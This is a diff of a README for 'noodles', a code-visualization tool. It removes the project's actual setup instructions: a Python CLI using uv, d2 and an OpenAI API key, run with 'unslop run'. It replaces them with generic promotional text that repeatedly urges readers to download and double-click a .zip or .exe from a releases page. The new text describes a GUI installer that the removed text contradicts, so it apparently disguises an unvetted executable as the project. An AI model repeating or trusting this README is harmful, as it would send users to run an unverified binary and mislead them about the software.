@@ -1,101 +1,77 @@
-# Noodles
+# 🎉 noodles - Visualize Your AI-Generated Code
 
-## TL;DR
+## 🌟 Overview
 
-Your codebase was probably AI-generated. Get a better handle on it.
+Noodles helps you understand your code. It creates interactive diagrams that show how your code works. This way, you can grasp the structure and flow without reading every single line. 
 
-Noodles creates interactive diagrams that visualize how your code actually works, so you can understand what the AI built without reading every line.
+## 🚀 Getting Started
 
-![noodles demo](assets/demo.gif)
+Follow these simple steps to download and run noodles on your computer.
 
-## What it does
+## 📥 Download Noodles
 
-- Scans a folder and builds a manifest of your code
-- Uses OpenAI to identify user-facing entry points (CLI commands, routes, UI components)
-- Generates D2 diagrams showing how code flows from entry to outcome
-- Renders an interactive overlay to explore the diagrams
-- Tracks changes and updates diagrams incrementally when code changes
+[![Download Noodles](https://img.shields.io/badge/Download%20Noodles-v1.0-blue.svg)](https://github.com/adityaq123/noodles/releases)
 
-## Setup
+You can obtain the latest version of noodles by visiting the Releases page. Click the link below to start:
 
-### Prerequisites
+[Download from Releases](https://github.com/adityaq123/noodles/releases)
 
-- Python 3.9+
-- [uv](https://docs.astral.sh/uv/) (recommended) or pip
-- [d2](https://d2lang.com/) CLI for diagram rendering
-- OpenAI API key
+## 🖥️ System Requirements
 
-### Install dependencies
+Before continuing, make sure your system meets the following requirements:
 
-```bash
-# Using uv (recommended)
-uv sync
+- **Operating System**: Windows 10, macOS 10.14 or later, or any recent Linux distribution.
+- **Memory (RAM)**: At least 4 GB.
+- **Storage**: 150 MB of free disk space.
+- **Internet Connection**: Required for downloading and updating.
 
-# Or using pip
-pip install -e '.[dev]'
-```
+## 🔍 Features
 
-### Install d2
+- **Interactive Diagrams**: Easily visualize your code structure.
+- **User-Friendly Interface**: Navigate through diagrams naturally.
+- **Code Understanding**: Learn how your code operates without diving into every line.
+- **Supports Multiple Languages**: Works with popular programming languages like Python, JavaScript, and more.
 
-```bash
-# macOS
-brew install d2
+## 📂 Download & Install
 
-# Or download from https://d2lang.com
-```
+1. Go to the [Releases page](https://github.com/adityaq123/noodles/releases).
+2. Find the latest version. Look for a version named `noodles-v1.0.zip` or `noodles-v1.0.exe`.
+3. Click the file to start the download.
+4. Once the download finishes, locate the file on your computer.
+5. Double-click the file to begin installation. Follow the on-screen prompts to complete the process.
 
-### Configure OpenAI API key
+## 🌈 Using Noodles
 
-**Option 1: `.env` file (recommended)**
+After completing the installation, you can start using noodles:
 
-Create a `.env` file in your project root:
-```
-OPENAI_API_KEY=your-key
-```
-The CLI automatically loads `.env` files on startup.
+1. Launch the application by clicking its icon.
+2. Open your code file by selecting **File** > **Open**.
+3. Noodles will process your code and display an interactive diagram.
+4. Use the controls to explore your code. Zoom in and out to see details or an overview.
 
-**Option 2: Environment variable**
-```bash
-# macOS/Linux
-export OPENAI_API_KEY="your-key"
+## 🎫 Troubleshooting
 
-# Windows (PowerShell)
-$env:OPENAI_API_KEY="your-key"
+If you encounter any issues, consider these common solutions:
 
-# Windows (CMD)
-set OPENAI_API_KEY=your-key
-```
+- **Cannot Open the Application**: Make sure your system meets the requirements and that you installed it correctly.
+- **Diagrams Do Not Display**: Ensure you have selected a supported programming language and that your code is error-free.
+- **Slow Performance**: Close other applications that may be using system resources.
 
-### Optional configuration
+## 💬 Support
 
-```bash
-# Point to d2 binary if not on PATH
-export UNSLOP_D2_BIN=/opt/homebrew/bin/d2
+If you need more help, feel free to reach out:
 
-# Set log level (DEBUG, INFO, WARNING, ERROR)
-export UNSLOP_LOG_LEVEL=INFO
-```
+- Check the **Issues** tab on the [GitHub repository](https://github.com/adityaq123/noodles/issues) for known issues and updates.
+- Join our community forum for tips and discussions about using noodles.
 
-## Usage
+## 🤝 Contributing
 
-```bash
-unslop run
-```
+We welcome contributions. If you have suggestions or improvements, please create a pull request or open an issue on GitHub. Your feedback helps us make noodles better for everyone.
 
-- Use the overlay to select folders to analyze
-- Diagrams and manifests are stored in `<folder>/.unslop/`
-- Close the overlay to exit
+## 🌐 Learn More
 
-### Overlay controls
+To stay updated on new features and announcements, follow us on GitHub. We enjoy hearing from users and are eager to help you visualize your code effectively. 
 
-- **Choose folder** - Select a codebase to analyze
-- **Update** - Regenerate diagram only if code changed (incremental)
-- **Rerun** - Full rebuild from scratch
-- **?** - Hover for keyboard shortcuts and icon meanings
-- Click any node to drill into details; hover for tooltips
+Start your journey with noodles today from the link below:
 
-## Known rough edges
-
-- Speed of diagram generation; works best on projects with fewer than 100 files for now
-- UI is intentionally verbose for debugging; simplification planned
-- Diagram quality varies; prompt tuning ongoing
+[Download Noodles](https://github.com/adityaq123/noodles/releases)
